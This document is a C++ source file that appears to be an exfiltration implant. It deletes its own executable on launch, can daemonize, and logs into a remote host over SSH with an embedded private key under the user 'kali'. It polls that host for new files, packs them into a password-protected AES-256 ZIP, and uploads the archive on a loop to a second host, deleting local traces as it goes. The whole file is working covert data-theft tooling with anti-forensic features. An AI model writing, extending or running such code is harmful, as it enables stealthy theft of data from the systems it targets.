#include <fstream>
#include <zip.h>
#include <fcntl.h>
#include <algorithm>
#include <chrono>
#include <thread>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <semaphore.h>
#include <csignal>
#include <optional>
#include <sstream>

#include "file-transfer.h"

using namespace std;
using namespace std::chrono;

bool debug_mode = true;
bool running = true;
sem_t zip_semaphore;

void debugprint(const string &message)
{
    if (debug_mode)
    {
        cout << message << endl;
    }
}

bool delete_self()
{
    // Open and unlink the running executable
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len == -1)
    {
        cerr << "Error deleting self." << endl;
        return false;
    }

    exe_path[len] = '\0';
    if (!delete_local_file(string(exe_path)))
    {
        cerr << "Error deleting self." << endl;
        return false;
    }

    return true;
}

ssh_session create_ssh_session(const string &host)
{
    ssh_session session = ssh_new();
    if (session == NULL)
        return NULL;

    // int verbosity = SSH_LOG_PROTOCOL;
    // ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(session, SSH_OPTIONS_USER, "kali");
    ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
    if (ssh_options_set(session, SSH_OPTIONS_PUBLICKEY_ACCEPTED_TYPES, "ssh-rsa,rsa-sha2-256,rsa-sha2-512") != 0)
    {
        cerr << "Error in setting ssh options: " << ssh_get_error(session) << endl;
    }

    ssh_key private_key;
    // ssh_key public_key;

    if (ssh_connect(session) != SSH_OK)
    {
        cerr << "Error connecting to " << host << ": " << ssh_get_error(session) << endl;
        ssh_free(session);
        return NULL;
    }

    if (ssh_pki_import_privkey_base64(PRIVATE_KEY.c_str(), nullptr, nullptr, nullptr, &private_key) != SSH_OK)
    {
        cerr << "Error importing private key: " << ssh_get_error(session) << endl;
        ssh_free(session);
        return NULL;
    }

    if (ssh_userauth_publickey(session, nullptr, private_key) != SSH_AUTH_SUCCESS)
    {
        cerr << "Error authenticating with public key: " << ssh_get_error(session) << endl;
        ssh_key_free(private_key);
        // ssh_key_free(public_key);
        ssh_disconnect(session);
        ssh_free(session);
        return NULL;
    }

    ssh_key_free(private_key);
    // ssh_key_free(public_key);
    return session;
}

sftp_session create_sftp_session(ssh_session session)
{
    sftp_session sftp = sftp_new(session);
    if (sftp == NULL)
    {
        cerr << "Error creating SFTP session: " << ssh_get_error(session) << endl;
        return NULL;
    }

    if (sftp_init(sftp) != SSH_OK)
    {
        cerr << "Error initializing SFTP session: " << ssh_get_error(session) << endl;
        sftp_free(sftp);
        return NULL;
    }

    return sftp;
}

bool list_new_files(sftp_session sftp, const string &path, time_t last_run, vector<string> &new_files)
{
    sftp_dir dir = sftp_opendir(sftp, path.c_str());
    if (!dir)
    {
        cerr << "Error opening directory: " << ssh_get_error(sftp) << endl;
        return false;
    }

    sftp_attributes attributes;
    while ((attributes = sftp_readdir(sftp, dir)) != NULL)
    {
        if (attributes->type == SSH_FILEXFER_TYPE_REGULAR && attributes->mtime > last_run)
        {
            string full_path = REMOTE1_COLLECT_DIR + attributes->name;

            if (!file_exists_in_zip(LOCAL_ZIP_PATH, attributes->name))
            {
                new_files.push_back(full_path);
            }
            else
            {
                debugprint("File already exists in ZIP: " + string(attributes->name));
            }
        }
        sftp_attributes_free(attributes);
    }

    sftp_closedir(dir);
    return !new_files.empty();
}

optional<vector<string>> check_for_new_files(sftp_session sftp, time_t last_run)
{
    vector<string> new_files;
    if (!list_new_files(sftp, REMOTE1_COLLECT_DIR, last_run, new_files))
    {
        return nullopt;
    }

    if (new_files.empty())
    {
        return nullopt;
    }
    else
    {
        cout << "New files found:" << endl;
        for (const string &file : new_files)
        {
            cout << file << endl;
        }
    }

    return new_files;
}

bool download_file(sftp_session sftp, const string &remote_file, pair<string, string> &file_contents)
{
    sftp_file file = sftp_open(sftp, remote_file.c_str(), O_RDONLY, 0);
    if (file == NULL)
    {
        cerr << "Failed to open file on RemoteHost1: " << remote_file << endl;
        return false;
    }

    stringstream buffer;
    char temp_buffer[1024];
    int nbytes;
    while ((nbytes = sftp_read(file, temp_buffer, sizeof(temp_buffer))) > 0)
    {
        buffer.write(temp_buffer, nbytes);
    }

    if (nbytes < 0)
    {
        cerr << "Failed to read file: " << remote_file << endl;
        sftp_close(file);
        return false;
    }

    sftp_close(file);
    file_contents.first = remote_file.substr(remote_file.find_last_of('/') + 1);
    file_contents.second = buffer.str();
    return true;
}

bool download_files(sftp_session sftp, const vector<string> &remote_files, const string &local_dir)
{
    for (const auto &remote_file : remote_files)
    {
        sftp_file file = sftp_open(sftp, remote_file.c_str(), O_RDONLY, 0);
        if (file == NULL)
        {
            cerr << "Failed to open file on RemoteHost1: " << remote_file << endl;
            return false;
        }

        ofstream ofs(local_dir + remote_file.substr(remote_file.find_last_of('/') + 1), ios::binary);
        if (!ofs.is_open())
        {
            sftp_close(file);
            return false;
        }

        char buffer[1024];
        int nbytes;
        while ((nbytes = sftp_read(file, buffer, sizeof(buffer))) > 0)
        {
            ofs.write(buffer, nbytes);
        }

        sftp_close(file);
        ofs.close();
    }
    return true;
}

bool create_zip_from_files(vector<string> &files, const string &local_dir, const string &zip_path, const string &password)
{
    sem_wait(&zip_semaphore);
    int error;
    zip_t *archive = zip_open(zip_path.c_str(), ZIP_CREATE, &error);
    if (!archive)
    {
        cerr << "Error creating ZIP archive: " << zip_strerror(archive) << endl;
        sem_post(&zip_semaphore);
        return false;
    }

    for (const auto &file : files)
    {
        zip_source_t *source = zip_source_file(archive, file.c_str(), 0, 0);
        if (source == NULL)
        {
            cerr << "Error adding file to ZIP archive: " << zip_strerror(archive) << endl;
            zip_close(archive);
            sem_post(&zip_semaphore);
            return false;
        }
        string filename = file.substr(file.find_last_of("/") + 1);
        zip_file_add(archive, filename.c_str(), source, ZIP_FL_ENC_UTF_8);
        zip_file_set_encryption(archive, zip_name_locate(archive, filename.c_str(), ZIP_FL_ENC_UTF_8), ZIP_EM_AES_256, password.c_str());

        string filepath = local_dir + filename;
        debugprint("Deleting local file: " + filepath);
        delete_local_file(filepath);
    }

    if (zip_close(archive) < 0)
    {
        cerr << "Error closing ZIP archive: " << zip_strerror(archive) << endl;
        sem_post(&zip_semaphore);
        return false;
    }
    sem_post(&zip_semaphore);
    return true;
}

bool file_exists_in_zip(const string &zip_path, const string &filename)
{
    int err;
    zip_t *archive = zip_open(zip_path.c_str(), 0, &err);
    if (!archive)
    {
        return false;
    }
    zip_int64_t index = zip_name_locate(archive, filename.c_str(), 0);
    zip_close(archive);
    return index >= 0;
}

bool append_to_zip(const string &file_name, const string &content, const string &zip_path, const string &password)
{
    sem_wait(&zip_semaphore);
    int error;
    zip_t *archive = zip_open(zip_path.c_str(), ZIP_CREATE, &error);
    if (!archive)
    {
        cerr << "Error creating ZIP archive: " << zip_strerror(archive) << endl;
        sem_post(&zip_semaphore);
        return false;
    }

    zip_source_t *source = zip_source_buffer(archive, content.data(), content.size(), 0);
    if (source == NULL)
    {
        cerr << "Error creating ZIP source: " << zip_strerror(archive) << endl;
        zip_close(archive);
        sem_post(&zip_semaphore);
        return false;
    }

    zip_file_add(archive, file_name.c_str(), source, ZIP_FL_ENC_UTF_8);
    zip_file_set_encryption(archive, zip_name_locate(archive, file_name.c_str(), ZIP_FL_ENC_UTF_8), ZIP_EM_AES_256, password.c_str());

    if (zip_close(archive) < 0)
    {
        cerr << "Error closing ZIP archive: " << zip_strerror(archive) << endl;
        sem_post(&zip_semaphore);
        return false;
    }
    sem_post(&zip_semaphore);
    return true;
}

bool delete_local_file(const string &local_file)
{
    return unlink(local_file.c_str()) == 0;
}

size_t get_file_size(string filename)
{
    struct stat stat_buf;
    int rc = stat(filename.c_str(), &stat_buf);
    return rc == 0 ? stat_buf.st_size : 0;
}

bool check_file_exists(string filename)
{
    struct stat stat_buf;
    return (stat(filename.c_str(), &stat_buf) == 0);
}

bool upload_file(sftp_session sftp, const string &local_file, const string &remote_file)
{
    sem_wait(&zip_semaphore);
    ifstream file(local_file, ios::binary);
    if (!file)
    {
        cerr << "Error opening local file: " << local_file << endl;
        sem_post(&zip_semaphore);
        return false;
    }

    sftp_file sftp_file = sftp_open(sftp, remote_file.c_str(), O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);
    if (!sftp_file)
    {
        cerr << "Error opening remote file: " << ssh_get_error(sftp) << endl;
        sem_post(&zip_semaphore);
        return false;
    }

    char buffer[4096];
    while (file.read(buffer, sizeof(buffer)) || file.gcount() > 0)
    {
        if (sftp_write(sftp_file, buffer, file.gcount()) != file.gcount())
        {
            cerr << "Error writing to remote file: " << ssh_get_error(sftp) << endl;
            sftp_close(sftp_file);
            sem_post(&zip_semaphore);
            return false;
        }
    }

    sftp_close(sftp_file);
    sem_post(&zip_semaphore);
    return true;
}

void signal_handler(int signum)
{
    running = false;
}

void daemonize()
{
    pid_t pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0)
        exit(EXIT_SUCCESS);

    if (setsid() < 0)
        exit(EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0)
        exit(EXIT_SUCCESS);

    umask(0);

    chdir("/");

    for (long x = sysconf(_SC_OPEN_MAX); x >= 0; x--)
    {
        close(x);
    }
}

void download_routine(const string &host)
{
    ssh_session session = create_ssh_session(host);
    if (session == NULL)
    {
        cerr << "Failed to create SSH session to " << host << endl;
        return;
    }

    sftp_session sftp = create_sftp_session(session);
    if (sftp == NULL)
    {
        cerr << "Failed to create SFTP session to " << host << endl;
        ssh_disconnect(session);
        ssh_free(session);
        return;
    }

    // List of filepaths on remote target that have yet to be downloaded
    vector<string> file_history;
    // Contains filename and file contents
    pair<string, string> file_contents;

    // initialize time for run
    time_t last_run = system_clock::to_time_t(system_clock::now());

    while (running)
    {
        auto now = system_clock::to_time_t(system_clock::now());
        optional<vector<string>> new_files = check_for_new_files(sftp, last_run);
        if (new_files)
        {
            last_run = now;

            for (const auto &file : new_files.value())
            {
                // Ensure file is not already in history. This can happen with very frequent checks.
                if (find(file_history.begin(), file_history.end(), file) == file_history.end())
                {
                    file_history.push_back(file);
                }
            }

            if (!file_history.empty())
            {
                vector<string> files_to_remove;
                for (const auto &file : file_history)
                {
                    if (get_file_size(LOCAL_ZIP_PATH) > MAX_ZIP_SIZE)
                    {
                        cerr << "ZIP file exceeds threshold. Waiting until deleted." << endl;
                        break;
                    }

                    debugprint("Downloading file: " + file);
                    if (!download_file(sftp, file, file_contents))
                    {
                        cerr << "Failed to download new file from " << host << endl;
                        break;
                    }

                    if (append_to_zip(file_contents.first, file_contents.second, LOCAL_ZIP_PATH, ZIP_PASSPHRASE))
                    {
                        cout << "Successfully added file ZIP archive." << endl;
                        // mark file for removal from history
                        files_to_remove.push_back(file);
                    }
                    else
                    {
                        cerr << "Failed to create ZIP archive." << endl;
                        break;
                    }
                }

                // Remove processed files from file_history
                for (const auto &file : files_to_remove)
                {
                    file_history.erase(remove(file_history.begin(), file_history.end(), file), file_history.end());
                }
            }
        }

        this_thread::sleep_for(seconds(CHECK_INTERVAL));
    }

    running = false;

    sftp_free(sftp);
    ssh_disconnect(session);
    ssh_free(session);
}

void upload_routine(const string &host, const string &remote_path)
{
    ssh_session session = create_ssh_session(host);
    if (session == NULL)
    {
        cerr << "Failed to create SSH session to " << host << endl;
        return;
    }

    sftp_session sftp = create_sftp_session(session);
    if (sftp == NULL)
    {
        cerr << "Failed to create SFTP session to " << host << endl;
        ssh_disconnect(session);
        ssh_free(session);
        return;
    }

    while (running)
    {
        if (check_file_exists(LOCAL_ZIP_PATH) && get_file_size(LOCAL_ZIP_PATH) <= MAX_ZIP_SIZE)
        {
            if (upload_file(sftp, LOCAL_ZIP_PATH, remote_path))
            {
                cout << "Successfully uploaded ZIP archive to " << host << endl;
                delete_local_file(LOCAL_ZIP_PATH);
            }
            else
            {
                cerr << "Failed to upload ZIP archive to " << host << endl;
                break;
            }
        }

        this_thread::sleep_for(seconds(20));
    }
    running = false;

    sftp_free(sftp);
    ssh_disconnect(session);
    ssh_free(session);
}

int main()
{
    signal(SIGINT, signal_handler);

    sem_init(&zip_semaphore, 0, 1);
    if (DELETE_ON_EXEC)
        delete_self();

    // daemonize();
    thread download_thread(download_routine, REMOTE_HOST1);
    thread upload_thread(upload_routine, REMOTE_HOST2, REMOTE2_DEST_PATH);

    download_thread.join();
    upload_thread.join();

    sem_destroy(&zip_semaphore);

    return 0;
}
